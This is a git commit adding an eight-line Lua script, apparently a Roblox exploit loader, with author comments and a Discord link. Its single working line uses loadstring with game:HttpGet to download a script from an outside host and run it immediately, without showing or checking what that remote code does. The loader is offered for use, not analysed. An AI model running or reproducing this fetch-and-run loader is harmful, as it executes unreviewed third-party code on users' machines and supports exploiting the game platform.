5dad8d7f1e9f39737a063fc9b1d0e3a700a763df
microace <youssifezzeldin@gmail.com>
2026-03-29 00:22:41 +0200

    Create lumialumialumia.lua with script loading
    Add initial Lua script with metadata and loadstring call

---
+++ lumialumialumia.lua
@@ -0,0 +1,8 @@
+-- why r u here lol
+-- made by jacob_5214
+-- last updated 28/03/2026
+-- https://discord.gg/smEjXefWut
+-- lumia rfl
+
+
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/363d222d1f2fe49e1cf02d9af08c84c2d63982d3e640e8eb26983430d372729a.lua"))()
